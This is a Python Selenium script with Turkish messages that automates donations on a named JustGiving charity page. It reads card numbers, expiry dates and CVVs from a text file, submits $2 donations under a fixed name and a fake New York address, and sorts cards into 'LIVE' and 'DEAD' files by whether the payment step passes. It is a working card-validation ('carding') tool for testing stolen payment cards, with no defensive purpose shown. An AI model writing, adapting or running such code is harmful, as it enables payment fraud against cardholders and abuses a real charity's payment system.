from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
import time

def safe_get(driver, url, retries=3):
    for i in range(retries):
        try:
            driver.get(url)
            return True
        except Exception as e:
            print(f"driver.get hatası: {e}, {i+1}. deneme")
            time.sleep(5)
    return False

def process_cards():
    chrome_options = Options()
    chrome_options.add_argument("--disable-webrtc")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    driver = webdriver.Chrome(options=chrome_options)
    wait = WebDriverWait(driver, 25)
    base_url = "https://www.justgiving.com/page/ali-bevans-teamtoby"

    with open("kartlar.txt", "r") as f:
        cards = f.read().splitlines()

    main_window = None

    for card in cards:
        print(f"İşlem başladı: {card}")
        try:
            card_data = card.split("|")
            card_number = card_data[0]
            expiry_month = card_data[1]
            expiry_year = card_data[2]
            cvv = card_data[3]

            if not safe_get(driver, base_url, retries=3):
                print("Siteye bağlanılamadı, kart işlenemedi, sıradaki karta geçiliyor.")
                with open("DEAD.txt", "a") as dead_file:
                    dead_file.write(f"{card}\n")
                continue

            time.sleep(5)

            if main_window is None:
                main_window = driver.current_window_handle

            try:
                accept_cookies_btn = wait.until(EC.element_to_be_clickable((By.ID, "accept-all-Cookies")))
                accept_cookies_btn.click()
                print("Cookies kabul edildi.")
            except:
                print("Cookies kabul butonu yok veya zaten kabul edilmiş.")

            give_now_clicked = False
            for attempt in range(5):
                try:
                    give_now_btn = wait.until(EC.presence_of_element_located((By.ID, "main-donate-button")))
                    driver.execute_script("arguments[0].click();", give_now_btn)
                    give_now_clicked = True
                    break
                except Exception as e:
                    print(f"Give Now tıklama hatası, tekrar deneniyor... {attempt + 1}/5 - Hata: {e}")
                    time.sleep(3)

            if not give_now_clicked:
                print("Give Now butonuna tıklanamadı.")
                with open("DEAD.txt", "a") as dead_file:
                    dead_file.write(f"{card}\n")
                continue

            wait.until(lambda d: len(d.window_handles) > 1)
            driver.switch_to.window(driver.window_handles[1])
            time.sleep(5)

            currency_select = Select(wait.until(EC.presence_of_element_located((By.ID, "donationCurrency"))))
            currency_select.select_by_value("USD")

            donation_value = wait.until(EC.presence_of_element_located((By.ID, "donationValue")))
            donation_value.clear()
            donation_value.send_keys("2")

            try:
                privacy_checkbox = driver.find_element(By.CSS_SELECTOR, "label[for='isAmountPrivate']")
                if not privacy_checkbox.is_selected():
                    privacy_checkbox.click()
            except:
                print("Gizlilik kutucuğu bulunamadı, atlandı.")

            driver.find_element(By.CSS_SELECTOR, "button[data-qa='amountPageContinueButton']").click()

            skip_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Skip Message')]")))
            skip_btn.click()

            card_num_input = wait.until(EC.presence_of_element_located((By.ID, "cardNumber")))
            card_num_input.clear()
            card_num_input.send_keys(card_number)

            name_on_card = driver.find_element(By.ID, "nameOnCard")
            name_on_card.clear()
            name_on_card.send_keys("Berkay Alsancak")

            Select(driver.find_element(By.NAME, "cardExpiryMonth")).select_by_value(expiry_month)
            Select(driver.find_element(By.NAME, "cardExpiryYear")).select_by_value(expiry_year)

            cvv_input = driver.find_element(By.ID, "cardSecurityCode")
            cvv_input.clear()
            cvv_input.send_keys(cvv)

            # **Adres alanlarını da dolduralım**
            house_input = driver.find_element(By.ID, "houseNameOrNumber")
            house_input.clear()
            house_input.send_keys("new york")

            zip_input = driver.find_element(By.ID, "zipOrPostalCode")
            zip_input.clear()
            zip_input.send_keys("10001")

            driver.find_element(By.CSS_SELECTOR, "button[data-qa='selectPaymentPageContinueButton']").click()

            try:
                wait.until(EC.presence_of_element_located((By.ID, "firstName")))
                print(f"Kart doğrulandı ve sonraki sayfaya geçildi: {card}")
                with open("LIVE.txt", "a") as live_file:
                    live_file.write(f"{card}\n")
                driver.close()
                driver.switch_to.window(main_window)
                continue
            except:
                print(f"Kart doğrulanamadı veya sonraki sayfa gelmedi: {card}")
                with open("DEAD.txt", "a") as dead_file:
                    dead_file.write(f"{card}\n")
                driver.close()
                driver.switch_to.window(main_window)
                continue

        except Exception as e:
            print(f"Hata oluştu kartta {card}: {e}")
            with open("DEAD.txt", "a") as dead_file:
                dead_file.write(f"{card}\n")
            try:
                if len(driver.window_handles) > 1:
                    driver.close()
                    driver.switch_to.window(main_window)
            except:
                pass
            continue

    driver.quit()

if __name__ == "__main__":
    process_cards()
